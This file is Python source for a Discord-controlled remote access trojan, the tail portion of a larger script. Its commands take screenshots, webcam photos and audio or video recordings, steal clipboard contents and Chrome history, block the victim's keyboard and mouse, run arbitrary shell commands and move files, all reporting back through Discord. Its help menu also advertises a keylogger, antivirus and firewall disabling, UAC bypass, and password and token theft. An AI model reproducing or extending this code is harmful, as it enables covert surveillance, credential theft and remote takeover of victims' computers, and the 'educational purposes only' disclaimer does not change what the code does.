# === WEBSITE OPEN ===
@bot.command(name='website')
@is_admin()
async def open_website(ctx, url: str):
    """Open website in default browser"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        subprocess.Popen(['start', url], shell=True)
        await ctx.send(f"🌐 Opening: {url}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === INPUT BLOCK/UNBLOCK ===
def block_input():
    global key_listener, mouse_listener
    
    def on_press(key):
        return False
    
    def on_release(key):
        return False
    
    def on_click(x, y, button, pressed):
        return False
    
    def on_scroll(x, y, dx, dy):
        return False
    
    key_listener = KeyListener(on_press=on_press, on_release=on_release)
    mouse_listener = MouseListener(on_click=on_click, on_scroll=on_scroll)
    
    key_listener.start()
    mouse_listener.start()

def unblock_input():
    global key_listener, mouse_listener
    if key_listener:
        key_listener.stop()
    if mouse_listener:
        mouse_listener.stop()

@bot.command(name='blockinput')
@is_admin()
async def block_input_cmd(ctx):
    """Block user's keyboard and mouse"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    global input_blocked
    if not input_blocked:
        block_input()
        input_blocked = True
        await ctx.send("🔒 Input blocked")
    else:
        await ctx.send("⚠️ Input already blocked")

@bot.command(name='unblockinput')
@is_admin()
async def unblock_input_cmd(ctx):
    """Unblock user's keyboard and mouse"""
    if not has_admin_privileges():
        await ctx.send("❌ Admin rights required for this command")
        return
    
    global input_blocked
    if input_blocked:
        unblock_input()
        input_blocked = False
        await ctx.send("🔓 Input unblocked")
    else:
        await ctx.send("⚠️ Input not blocked")

# === FILE SYSTEM COMMANDS ===
@bot.command(name='cd')
@is_admin()
async def change_directory(ctx, new_path: str):
    """Change current directory"""
    global current_directory
    try:
        if os.path.exists(new_path) and os.path.isdir(new_path):
            os.chdir(new_path)
            current_directory = os.getcwd()
            await ctx.send(f"📁 Directory changed to: `{current_directory}`")
        else:
            await ctx.send("❌ Directory does not exist")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='currentdir')
@is_admin()
async def show_current_dir(ctx):
    """Display current directory"""
    await ctx.send(f"📁 Current directory: `{os.getcwd()}`")

@bot.command(name='displaydir')
@is_admin()
async def display_directory(ctx):
    """Display all items in current directory"""
    try:
        items = os.listdir()
        dirs = [f"📁 {item}" for item in items if os.path.isdir(item)]
        files = [f"📄 {item}" for item in items if os.path.isfile(item)]
        
        output = "\n".join(dirs + files)
        if len(output) > 1900:
            output = output[:1900] + "..."
        
        await ctx.send(f"```{output}```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === CLIPBOARD ===
@bot.command(name='clipboard')
@is_admin()
async def get_clipboard(ctx):
    """Retrieve clipboard content"""
    try:
        result = subprocess.run(['powershell', 'Get-Clipboard'], capture_output=True, text=True)
        content = result.stdout.strip()
        if content:
            await ctx.send(f"📋 Clipboard content:\n```{content}```")
        else:
            await ctx.send("📋 Clipboard is empty")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === SYSTEM INFO ===
@bot.command(name='sysinfo')
@is_admin()
async def system_info(ctx):
    """Get system information"""
    try:
        uname = platform.uname()
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        # Get IP information
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            public_ip = "Unable to retrieve"
        
        embed = discord.Embed(title="🖥️ System Information", color=0x00ff00)
        embed.add_field(name="System", value=f"{uname.system} {uname.release}", inline=True)
        embed.add_field(name="Computer Name", value=uname.node, inline=True)
        embed.add_field(name="Processor", value=uname.processor, inline=False)
        embed.add_field(name="CPU Usage", value=f"{psutil.cpu_percent()}%", inline=True)
        embed.add_field(name="Memory", value=f"{memory.percent}% used", inline=True)
        embed.add_field(name="Disk", value=f"{disk.percent}% used", inline=True)
        embed.add_field(name="Local IP", value=local_ip, inline=True)
        embed.add_field(name="Public IP", value=public_ip, inline=True)
        embed.add_field(name="Admin Rights", value="✅ Yes" if has_admin_privileges() else "❌ No", inline=True)
        
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === SCREENSHOT ===
@bot.command(name='screenshot')
@is_admin()
async def take_screenshot(ctx):
    """Take a screenshot"""
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save('screenshot.png')
        await ctx.send(file=discord.File('screenshot.png'))
        os.remove('screenshot.png')
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === WEBCAM ===
@bot.command(name='webcampic')
@is_admin()
async def webcam_picture(ctx):
    """Take picture from webcam"""
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('webcam.jpg', frame)
                await ctx.send(file=discord.File('webcam.jpg'))
                os.remove('webcam.jpg')
            else:
                await ctx.send("❌ Could not access webcam")
            cap.release()
        else:
            await ctx.send("❌ No webcam detected")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === RECORDING FUNCTIONS ===
def record_audio(duration, filename):
    """Record audio for specified duration"""
    try:
        if audio is None:
            return False
            
        stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
        frames = []
        
        for _ in range(0, int(44100 / 1024 * duration)):
            data = stream.read(1024)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        
        wf = wave.open(filename, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
        wf.setframerate(44100)
        wf.writeframes(b''.join(frames))
        wf.close()
        return True
    except:
        return False

def record_video(duration, filename, camera_index=0):
    """Record video from webcam"""
    try:
        cap = cv2.VideoCapture(camera_index)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        
        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break
        
        cap.release()
        out.release()
        return True
    except:
        return False

@bot.command(name='recaudio')
@is_admin()
async def record_audio_cmd(ctx, duration: int = 10):
    """Record audio for specified duration"""
    if duration > 60:
        await ctx.send("❌ Maximum recording duration is 60 seconds")
        return
    
    await ctx.send(f"🎙️ Recording audio for {duration} seconds...")
    filename = f"audio_{int(time.time())}.wav"
    
    if record_audio(duration, filename):
        await ctx.send(file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send("❌ Error recording audio")

@bot.command(name='reccam')
@is_admin()
async def record_camera_cmd(ctx, duration: int = 10):
    """Record camera video"""
    if duration > 30:
        await ctx.send("❌ Maximum recording duration is 30 seconds")
        return
    
    await ctx.send(f"📹 Recording camera for {duration} seconds...")
    filename = f"webcam_{int(time.time())}.avi"
    
    if record_video(duration, filename):
        await ctx.send(file=discord.File(filename))
        os.remove(filename)
    else:
        await ctx.send("❌ Error recording camera")

# === VOLUME CONTROL ===
@bot.command(name='volumemax')
@is_admin()
async def volume_max(ctx):
    """Set volume to maximum"""
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        volume.SetMasterVolumeLevelScalar(1.0, None)
        await ctx.send("🔊 Volume set to maximum")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='volumezero')
@is_admin()
async def volume_zero(ctx):
    """Set volume to zero"""
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        volume.SetMasterVolumeLevelScalar(0.0, None)
        await ctx.send("🔇 Volume set to zero")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === TEXT-TO-SPEECH ===
@bot.command(name='voice')
@is_admin()
async def text_to_speech(ctx, *, text):
    """Convert text to speech"""
    try:
        tts = gTTS(text=text, lang='en')
        with tempfile.NamedTemporaryFile(delete=False, suffix='.mp3') as tmp:
            tts.save(tmp.name)
            subprocess.run(['ffmpeg', '-i', tmp.name, 'output.wav'], capture_output=True)
            subprocess.run(['powershell', '-c', '(New-Object Media.SoundPlayer "output.wav").PlaySync();'])
            os.remove(tmp.name)
            if os.path.exists('output.wav'):
                os.remove('output.wav')
        await ctx.send(f"🗣️ Said: '{text}'")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === FILE OPERATIONS ===
@bot.command(name='delete')
@is_admin()
async def delete_file(ctx, file_path: str):
    """Delete a file"""
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            await ctx.send(f"✅ Deleted: {file_path}")
        else:
            await ctx.send("❌ File not found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='hide')
@is_admin()
async def hide_file(ctx, file_path: str):
    """Hide a file"""
    try:
        if os.path.exists(file_path):
            subprocess.run(['attrib', '+h', file_path])
            await ctx.send(f"👻 Hidden: {file_path}")
        else:
            await ctx.send("❌ File not found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='unhide')
@is_admin()
async def unhide_file(ctx, file_path: str):
    """Unhide a file"""
    try:
        if os.path.exists(file_path):
            subprocess.run(['attrib', '-h', file_path])
            await ctx.send(f"👀 Unhidden: {file_path}")
        else:
            await ctx.send("❌ File not found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === SYSTEM CONTROL ===
@bot.command(name='shutdown')
@is_admin()
async def shutdown_cmd(ctx, delay: int = 60):
    """Shutdown computer"""
    try:
        subprocess.run(f'shutdown /s /t {delay}', shell=True)
        await ctx.send(f"🔴 Shutdown in {delay} seconds")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='restart')
@is_admin()
async def restart_cmd(ctx, delay: int = 60):
    """Restart computer"""
    try:
        subprocess.run(f'shutdown /r /t {delay}', shell=True)
        await ctx.send(f"🔄 Restart in {delay} seconds")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='logoff')
@is_admin()
async def logoff_cmd(ctx):
    """Log off current user"""
    try:
        subprocess.run('shutdown /l', shell=True)
        await ctx.send("🚪 Logging off...")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === MESSAGE BOX ===
@bot.command(name='message')
@is_admin()
async def show_message(ctx, *, text):
    """Show message box"""
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "Admin Message", 0x40)
        await ctx.send(f"💬 Message displayed: {text}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === PROCESS KILL ===
@bot.command(name='prockill')
@is_admin()
async def kill_process(ctx, process_name: str):
    """Kill process by name"""
    try:
        killed = False
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name.lower():
                try:
                    proc.kill()
                    killed = True
                except:
                    continue
        
        if killed:
            await ctx.send(f"☠️ Killed process: {process_name}")
        else:
            await ctx.send(f"❌ Process not found: {process_name}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === BROWSER HISTORY ===
@bot.command(name='history')
@is_admin()
async def get_chrome_history(ctx):
    """Get Chrome browser history"""
    try:
        history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
        
        if os.path.exists(history_path):
            shutil.copy2(history_path, 'chrome_history.db')
            
            conn = sqlite3.connect('chrome_history.db')
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
            
            history = cursor.fetchall()
            conn.close()
            os.remove('chrome_history.db')
            
            if history:
                output = "\n".join([f"{title}: {url}" for url, title, _ in history])
                await ctx.send(f"🌐 Recent Chrome history:\n```{output}```")
            else:
                await ctx.send("📝 No Chrome history found")
        else:
            await ctx.send("❌ Chrome history not found")
    except Exception as e:
        await ctx.send(f"❌ Error accessing history: {str(e)}")

# === IDLE TIME ===
@bot.command(name='idletime')
@is_admin()
async def get_idle_time(ctx):
    """Get user idle time"""
    try:
        idle_time = (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0
        await ctx.send(f"⏰ Idle time: {int(idle_time)} seconds")
    except:
        await ctx.send("❌ Could not retrieve idle time")

# === GEOLOCATION (ENHANCED) ===
@bot.command(name='geolocate')
@is_admin()
async def geolocate(ctx):
    """Get detailed geolocation information"""
    try:
        await ctx.send("📍 Gathering geolocation information...")
        
        # Get public IP
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            public_ip = "Unable to retrieve"
        
        # Get detailed location information
        try:
            response = requests.get(f'http://ip-api.com/json/{public_ip}', timeout=10)
            data = response.json()
            
            if data['status'] == 'success':
                embed = discord.Embed(title="📍 Geolocation Information", color=0x7289da)
                embed.add_field(name="🌐 Public IP", value=f"`{public_ip}`", inline=True)
                embed.add_field(name="🏙️ City", value=data.get('city', 'Unknown'), inline=True)
                embed.add_field(name="🏛️ Region", value=data.get('regionName', 'Unknown'), inline=True)
                embed.add_field(name="🇺🇸 Country", value=data.get('country', 'Unknown'), inline=True)
                embed.add_field(name="📮 ZIP Code", value=data.get('zip', 'Unknown'), inline=True)
                embed.add_field(name="🕐 Timezone", value=data.get('timezone', 'Unknown'), inline=True)
                embed.add_field(name="📡 ISP", value=data.get('isp', 'Unknown'), inline=True)
                embed.add_field(name="🏢 Organization", value=data.get('org', 'Unknown'), inline=True)
                embed.add_field(name="📍 Coordinates", value=f"{data.get('lat', 'N/A')}, {data.get('lon', 'N/A')}", inline=True)
                
                # Create Google Maps link
                if data.get('lat') and data.get('lon'):
                    maps_url = f"https://maps.google.com/?q={data['lat']},{data['lon']}"
                    embed.add_field(name="🗺️ Google Maps", value=f"[Open Location]({maps_url})", inline=True)
                
                await ctx.send(embed=embed)
            else:
                await ctx.send(f"❌ Could not retrieve detailed location information for IP: `{public_ip}`")
                
        except Exception as e:
            await ctx.send(f"🌐 Public IP: `{public_ip}`\n❌ Could not get detailed location: {str(e)}")
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === UPLOAD/DOWNLOAD ===
@bot.command(name='upload')
@is_admin()
async def upload_file(ctx):
    """Upload a file"""
    if not ctx.message.attachments:
        await ctx.send("❌ Please attach a file")
        return
    
    attachment = ctx.message.attachments[0]
    try:
        await attachment.save(attachment.filename)
        await ctx.send(f"✅ Uploaded: {attachment.filename}")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command(name='download')
@is_admin()
async def download_file(ctx, file_path: str):
    """Download a file"""
    try:
        if os.path.exists(file_path) and os.path.isfile(file_path):
            await ctx.send(file=discord.File(file_path))
        else:
            await ctx.send("❌ File not found")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === SESSION MANAGEMENT ===
@bot.command(name='kill')
@is_admin()
async def kill_session(ctx, session: str = "all"):
    """Kill sessions"""
    if session == "all":
        await ctx.send("🔄 This would kill all sessions")
    else:
        await ctx.send(f"🔄 This would kill session: {session}")

# === SHELL COMMAND ===
@bot.command(name='shell')
@is_admin()
async def shell_command(ctx, *, command):
    """Execute shell command"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        
        if len(output) > 1900:
            output = output[:1900] + "..."
            
        embed = discord.Embed(title=f"Command: {command}", color=0x0099ff)
        embed.add_field(name="Output", value=f"```{output}```", inline=False)
        await ctx.send(embed=embed)
    except subprocess.TimeoutExpired:
        await ctx.send("⏰ Command timed out")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# === AUDIO PLAYBACK ===
@bot.command(name='audio')
@is_admin()
async def play_audio(ctx):
    """Play an audio file"""
    if not ctx.message.attachments:
        await ctx.send("❌ Please attach a .wav file")
        return
    
    attachment = ctx.message.attachments[0]
    if not attachment.filename.lower().endswith('.wav'):
        await ctx.send("❌ Only .wav files are supported")
        return
    
    try:
        await attachment.save('temp_audio.wav')
        subprocess.run(['powershell', '-c', '(New-Object Media.SoundPlayer "temp_audio.wav").PlaySync();'])
        await ctx.send("🔊 Audio played successfully")
        os.remove('temp_audio.wav')
    except Exception as e:
        await ctx.send(f"❌ Error playing audio: {str(e)}")

# === DATE AND TIME ===
@bot.command(name='dateandtime')
@is_admin()
async def date_time(ctx):
    """Get system date and time"""
    now = datetime.datetime.now()
    await ctx.send(f"📅 Date and Time: {now.strftime('%Y-%m-%d %H:%M:%S')}")

# === EXIT COMMAND ===
@bot.command(name='exit')
@is_admin()
async def exit_bot(ctx):
    """Exit the program"""
    await ctx.send("👋 Shutting down bot...")
    await bot.close()

# === HELP COMMAND (COMPLETE) ===
@bot.command(name='admin_help')
@is_admin()
async def help_command(ctx):
    """Show all available commands with complete details"""
    embed = discord.Embed(
        title="🛠️ Complete Admin Commands List", 
        description="All available commands for the Discord Remote Admin Bot",
        color=0x7289da
    )
    
    commands_info = {
        "👥 User Management": [
            "`!add_user <user_id>` - Add user to admin list",
            "`!remove_user <user_id>` - Remove user from admin list", 
            "`!list_users` - List all admin users",
            "`!userinfo` - Display authorized users"
        ],
        "🔗 Startup Persistence": [
            "`!startup` - Install with admin privileges on startup",
            "`!startup_status` - Check persistence status", 
            "`!remove_startup` - Remove all persistence methods"
        ],
        "🖥️ System Control": [
            "`!sysinfo` - Detailed system information",
            "`!admincheck` - Check admin privileges",
            "`!shutdown <seconds>` - Shutdown computer (default: 60s)",
            "`!restart <seconds>` - Restart computer (default: 60s)",
            "`!logoff` - Log off current user",
            "`!bluescreen` - Trigger blue screen (DANGEROUS)",
            "`!confirmbluescreen` - Confirm blue screen",
            "`!uacbypass` - Attempt UAC bypass",
            "`!exit` - Exit the bot"
        ],
        "🛡️ Security & Antivirus": [
            "`!disableantivirus` - Disable Windows Defender",
            "`!disablefirewall` - Disable Windows Firewall", 
            "`!distaskmgr` - Disable Task Manager",
            "`!enbtaskmgr` - Enable Task Manager",
            "`!getwifipass` - Get all WiFi passwords",
            "`!windowspass` - Attempt Windows password dump",
            "`!getdiscordinfo` - Get Discord tokens and data"
        ],
        "👀 Monitoring & Surveillance": [
            "`!startkeylogger` - Start keylogger",
            "`!stopkeylogger` - Stop keylogger", 
            "`!dumpkeylogger` - Dump keylog data",
            "`!screenshot` - Take screenshot",
            "`!webcampic` - Take webcam picture",
            "`!recaudio <seconds>` - Record audio (max 60s)",
            "`!reccam <seconds>` - Record camera (max 30s)"
        ],
        "📁 File Operations": [
            "`!cd <path>` - Change directory",
            "`!currentdir` - Show current directory", 
            "`!displaydir` - List directory contents",
            "`!upload` - Upload attached file",
            "`!download <path>` - Download file",
            "`!delete <path>` - Delete file",
            "`!hide <path>` - Hide file",
            "`!unhide <path>` - Unhide file",
            "`!selfdestruct` - Remove all traces"
        ],
        "💾 System Persistence": [
            "`!clipboard` - Get clipboard content"
        ],
        "🖱️ Input Control": [
            "`!blockinput` - Block keyboard/mouse input",
            "`!unblockinput` - Unblock input"
        ],
        "🔊 Audio Control": [
            "`!volumemax` - Set volume to maximum",
            "`!volumezero` - Set volume to zero",
            "`!voice <text>` - Text to speech",
            "`!audio` - Play attached audio file"
        ],
        "🖼️ Display & Hardware": [
            "`!displayon` - Turn monitor on",
            "`!displayoff` - Turn monitor off", 
            "`!ejectcd` - Eject CD drive",
            "`!retractcd` - Retract CD drive",
            "`!wallpaper` - Change wallpaper (attach image)"
        ],
        "🌐 Network & Location": [
            "`!geolocate` - Detailed geolocation info",
            "`!website <url>` - Open website in browser",
            "`!history` - Get Chrome browser history"
        ],
        "⚙️ Other Commands": [
            "`!message <text>` - Show message box",
            "`!prockill <name>` - Kill process by name",
            "`!idletime` - Get user idle time", 
            "`!dateandtime` - Get system date/time",
            "`!shell <command>` - Execute shell command"
        ]
    }
    
    for category, cmds in commands_info.items():
        embed.add_field(name=category, value="\n".join(cmds), inline=False)
    
    embed.set_footer(text=f"Total Commands: {sum(len(cmds) for cmds in commands_info.values())} | Use !<command> for help")
    await ctx.send(embed=embed)

# Error handling
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("❌ You don't have permission to use this command.")
    else:
        await ctx.send(f"❌ Error: {str(error)}")

if __name__ == "__main__":
    # Validate configuration
    if DISCORD_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Please set your DISCORD_TOKEN in the configuration section!")
        sys.exit(1)
    
    if 123456789012345678 in ADMIN_USER_IDS:
        print("❌ ERROR: Please replace the default user IDs in ADMIN_USER_IDS with your actual user IDs!")
        sys.exit(1)
    
    print("🚀 Starting Discord Remote Admin Bot...")
    print("⚠️  WARNING: This software is for educational purposes only!")
    print("⚠️  Only use on systems you own and have permission to access!")
    
    try:
        bot.run(DISCORD_TOKEN)
    except discord.LoginFailure:
        print("❌ Invalid Discord token. Please check your DISCORD_TOKEN.")
    except Exception as e:
        print(f"❌ Error starting bot: {e}")
